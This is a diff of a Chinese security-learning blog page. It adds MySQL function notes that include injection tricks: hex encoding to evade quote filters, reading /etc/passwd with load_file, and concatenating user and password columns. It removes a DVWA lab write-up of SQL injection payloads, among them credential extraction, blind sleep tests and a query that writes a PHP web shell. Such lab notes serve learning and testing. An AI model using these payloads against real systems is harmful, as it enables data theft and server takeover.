@@ -78,6 +78,83 @@
         <header class="article-info clearfix">
   <h1 itemprop="name">
     
+      <a href="/02/15/2016/daily-sql/" title="sql日常记录" itemprop="url">sql日常记录</a>
+  </h1>
+  <p class="article-author">By
+       
+		<a href="https://plus.google.com/106896526077043222500?rel=author" title="A1ex" target="_blank" itemprop="author">A1ex</a>
+		
+  <p class="article-time">
+    <time datetime="2016-02-15T06:29:57.623Z" itemprop="datePublished"> 发表于 02-15-2016</time>
+    
+  </p>
+</header>
+    <div class="article-content">
+        
+        <ol>
+<li>字符串截取<br> left(str, len);    /    right(str, len);        //len&gt;= 0<br> i.e.    :    select left(‘abcde’, 4);            //截取前面四个</li>
+<li>char(60,112,62)<br> <p>            //可以用来字符截取,字太多了</p></li>
+<li>version()            -&gt;5.6.11</li>
+<li>limit m,n           m-start      n—length    <code>开始为0</code><br>limit n             n—length</li>
+<li>cast(value as type)       获取一个类型的值,并转换类型<br>convert(type ,value)      转换类型      type -&gt;signed unsigned<br>cast(‘a’ as signed)             返回0        cast(‘123’ as int)    返回123<br>convert( int ,’123’)        返回123</li>
+<li>concat( a, b)  连接函数,对ab进行连接</li>
+<li>mit(a,1,50)       1-50 截取字符串</li>
+<li>select * from (xxx)a    a为别名</li>
+<li>group by xx   以字段分类</li>
+<li>select count(*)   返回统计的行数</li>
+<li>0x7171    类似于高亮,更加明显</li>
+<li>IFNULL(a,0x22)        判断是否为NULL,是的话就返回0x22,否则返回a</li>
+<li>0x7423 的写法可以规避单引号过滤 </li>
+<li>distinct 过滤重复</li>
+<li>group_concat( user ,0x3a, password)<br>group_concat()会计算哪些行属于同一组,将属于同一组的列显示出来.要返回哪些列,由函<br>数参数(就是字段名)决定.分组必须有个标准,就是根据group by指定的列进行分组    <a href="http://www.cnblogs.com/wangtao_20/archive/2011/02/23/1961860.html" target="_blank" rel="external">王滔’s blog</a>‘</li>
+<li>char(115)  unicode-&gt;string</li>
+<li>version()  @@version         版本号</li>
+<li>@@datadir         mysql物理路径</li>
+<li>user()     当前的mysql用户        example: root@localhost</li>
+<li>load_file()     加载物理路径,需要file_priv权限<br>windows: load_file(‘c:\boot.ini’)<br>linux:     load_file(‘/etc/passwd’)<br>可以利用hex编码避免php的正则匹配 load_file(0x编码后字符)</li>
+<li>ORD()     ord(‘i’)    返回第一个字符的ASCII</li>
+<li>EXISTS()     指定一个子查询，检测行的存在返回Blooean结果</li>
+<li>MID(String, Start [, Length])          取子串        MySQL<br>[substring/]substr(String,Start[,Length])        取子串        支持SQL Server,Oracle[MySQL]<br>注意:<code>开始位置为1</code> 但是0为起始点不会报错,不过不回显示任何东西</li>
+<li>WHERE itemid (REGEXP 0x5b5e302d395d)     <code>REGEXP</code>正则对象的使用</li>
+<li><code>----手动高亮----</code><br>concat( select database() ) 会导致mysql语法错误,想了一会儿知道原因了…<br><code>concat( (select database()) , &#39;xxx&#39; );</code>   看完这句话然后默默的删掉’xxx’,然后自然就懂啦</li>
+<li>length( )    显示长度,返回int</li>
+<li>ascii()    字符转ascii<br>  char()    ascii转字符</li>
+<li></li>
+</ol>
+
+        
+        
+        <p class="article-more-link">
+          
+       </p>
+    </div>
+    <footer class="article-footer clearfix">
+
+
+
+<div class="comments-count">
+	
+	  	<span></span>
+		<a href="/02/15/2016/daily-sql/#comments" class="ds-thread-count comments-count-link" data-thread-key="02/15/2016/daily-sql/" data-count-type="comments">&nbsp;</a>
+	
+</div>
+
+</footer>
+
+
+    </article>
+
+
+
+
+
+
+   
+    
+    <article class="post-expand post" itemprop="articleBody"> 
+        <header class="article-info clearfix">
+  <h1 itemprop="name">
+    
       <a href="/02/13/2016/elanTouchpad/" title="linux-触摸板失效解决" itemprop="url">linux-触摸板失效解决</a>
   </h1>
   <p class="article-author">By
@@ -769,70 +846,6 @@ tar -czvf -g zeng aa<span class="class">.tar</span><span class="class">.gz</span
 
 
 
-   
-    
-    <article class="post-expand post" itemprop="articleBody"> 
-        <header class="article-info clearfix">
-  <h1 itemprop="name">
-    
-      <a href="/11/10/2015/mysqlDvwa/" title="DVWA-SQLInject" itemprop="url">DVWA-SQLInject</a>
-  </h1>
-  <p class="article-author">By
-       
-		<a href="https://plus.google.com/106896526077043222500?rel=author" title="A1ex" target="_blank" itemprop="author">A1ex</a>
-		
-  <p class="article-time">
-    <time datetime="2015-11-09T16:00:00.000Z" itemprop="datePublished"> 发表于 11-10-2015</time>
-    
-  </p>
-</header>
-    <div class="article-content">
-        
-        <h1 id="DVWA笔记">DVWA笔记</h1><h2 id="0x1_Low_Injection">0x1 Low Injection</h2><h3 id="0x00_order_by_x_desc">0x00  order by x desc</h3><p>判断是否存在注入<br>可以判断<code>字段</code>数</p>
-<h3 id="0x01_union_select_1,2,3_—">0x01 union select 1,2,3  —</h3><p>用来判断在web显示的字段长度,长度不匹配就会返回错误<br><code>如果知道字段和表</code><br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1'union <span class="operator"><span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> <span class="keyword">password</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> user_id =<span class="number">1</span>)<span class="comment">--     '</span></span></span><br></pre></td></tr></table></figure></p>
-<h3 id="0x02_获取库名">0x02 获取库名</h3><p>一旦可以进行union操作,即可利用information_schema.schemata<br>union虽然限制了显示内容,但是我们可以利用concat_ws()进行字符串连接增加显示<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">  1'union <span class="operator"><span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">concat_ws</span>(<span class="built_in">char</span>(<span class="number">32</span>,<span class="number">58</span>,<span class="number">32</span>),<span class="keyword">user</span>(),<span class="keyword">database</span>(),<span class="keyword">version</span>()))<span class="comment">--            </span></span><br><span class="line"><span class="string">'</span></span></span><br></pre></td></tr></table></figure></p>
-<p>concat_ws(‘ ‘,      ‘a’,’b’)     字符串连接函数,用空格连接a和b<br>char(32,58,32)                     unicode转字符<br>user()              返回当前用户<br>database()     当前数据库<br>version()         Mysql版本</p>
-<h3 id="0x03_获取版本信息_数据库">0x03 获取版本信息 数据库</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1'union <span class="operator"><span class="keyword">select</span> <span class="number">1</span>,schema_name <span class="keyword">from</span> information_schema.schemata<span class="comment">-- </span></span><br><span class="line"><span class="string">'</span></span></span><br></pre></td></tr></table></figure>
-<p>information_schema.schemata     这个表显示的是所有的表名</p>
-<h3 id="0x04_显示当前的用户名和密码">0x04 显示当前的用户名和密码</h3><p>concat(user, ‘:’ , password);                 //和concat_ws()有所不一样,直接连接<br>1’union select 1,(concat(user,’:’,password)) from mysql.user—<br>//读取mysql数据库中user表的user和password字段内容</p>
-<h3 id="0x05_读取系统文件">0x05 读取系统文件</h3><p>load_file(‘../../xx.txt’);          文件目录不能无限../<br>load_file(‘E:/xampp/xx.text’);      //可以直接用这个方法</p>
-<h3 id="0x06_注入点直接写入shell">0x06 注入点直接写入shell</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">'union select 1,     "&lt;?php</span><br><span class="line">system($_GET('</span>hexo<span class="string">'));    //hexo作为一个变量</span><br><span class="line">?&gt;" into outfile '</span>../../shell.php<span class="string">'--</span></span><br></pre></td></tr></table></figure>
-<h2 id="0x1_Low_Blind_Injection">0x1 Low Blind Injection</h2><h3 id="0x01_判断是否存在注入点">0x01  判断是否存在注入点</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1' and sleep(4)<span class="comment">-- </span></span><br><span class="line">'</span><br></pre></td></tr></table></figure>
-<p>如果存在注入点,网页会在4秒之后才会有反应</p>
-<h3 id="0x02_后面">0x02 后面</h3><p>和普通的一样,把最后一个换成<code>sleep(5)</code><br>sleep()如果sleep无效试试benchmark()[MySQL5.0以下]//这个没试过,以后直接查询手册即可</p>
-<p>其他的也都差不多</p>
-<h3 id="0x03_Medium_&amp;_High">0x03 Medium &amp; High</h3><p>Medium:   @直接关闭了错误回显<br>//这个的话盲注依然可以,但是需要耐心了<br>High:   检测是否被攻击,然后0-5秒内自动sleep()<br>//也需要时间把,更多而已,设成10秒就可以很明显了,结合F12的network看一下就行了</p>
-<h3 id="SQLMAP基本用法:">SQLMAP基本用法:</h3><p>定了注入的URL<br>-p 参数指定了注入的参数，这里指定了id，也就是通过URL中的id参数注入，遇到多参数的URL时候这个-p就十分有用了。<br>—current-db，让SQLMAP列举出当前的数据库名称<br>-v 这个参数这里并没有使用到，这个参数会改变输出log的详细程度，一般默认即可，如果是学习或是想查看sqlmap使用的payload，可以使用-v 3参数。<br>—level 这个很有bi用咯，我个人理解是提高检测的等级，也就是说level 3会比level 1使用更多的payload进行测试。</p>
-<h2 id="小技巧">小技巧</h2><p>id = -1 也可以实现报错,在没有引号的情况跟之下23w32217uy7yuhjnm 65ythggb</p>
-<h2 id="Reference">Reference</h2><p>Web漏洞实战教程 DVWA的使用和漏洞分析</p>
-
-        
-        
-        <p class="article-more-link">
-          
-       </p>
-    </div>
-    <footer class="article-footer clearfix">
-
-
-
-<div class="comments-count">
-	
-	  	<span></span>
-		<a href="/11/10/2015/mysqlDvwa/#comments" class="ds-thread-count comments-count-link" data-thread-key="11/10/2015/mysqlDvwa/" data-count-type="comments">&nbsp;</a>
-	
-</div>
-
-</footer>
-
-
-    </article>
-
-
-
-
-
-
 
   <nav id="page-nav" class="clearfix">
     <a class="extend prev" rel="prev" href="/"><span></span>Prev</a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><a class="page-number" href="/page/5/">5</a><a class="extend next" rel="next" href="/page/3/">Next<span></span></a>
@@ -857,7 +870,7 @@ tar -czvf -g zeng aa<span class="class">.tar</span><span class="class">.gz</span
   
   <div class="archiveslist">
     <p class="asidetitle"><a href="/archives">归档</a></p>
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/04/">四月 2016</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/03/">三月 2016</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/02/">二月 2016</a><span class="archive-list-count">6</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/01/">一月 2016</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/12/">十二月 2015</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/11/">十一月 2015</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/10/">十月 2015</a><span class="archive-list-count">15</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/09/">九月 2015</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/07/">七月 2015</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/06/">六月 2015</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/03/">三月 2015</a><span class="archive-list-count">1</span></li></ul>
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/04/">四月 2016</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/03/">三月 2016</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/02/">二月 2016</a><span class="archive-list-count">6</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/01/">一月 2016</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/12/">十二月 2015</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/11/">十一月 2015</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/10/">十月 2015</a><span class="archive-list-count">15</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/09/">九月 2015</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/07/">七月 2015</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/06/">六月 2015</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/03/">三月 2015</a><span class="archive-list-count">1</span></li></ul>
   </div>
 
 
@@ -883,7 +896,7 @@ tar -czvf -g zeng aa<span class="class">.tar</span><span class="class">.gz</span
 		  
 		
 		  
-			<li><a href="/categories/Linux/" title="Linux">Linux<sup>14</sup></a></li>
+			<li><a href="/categories/Linux/" title="Linux">Linux<sup>15</sup></a></li>
 		  
 		
 		  
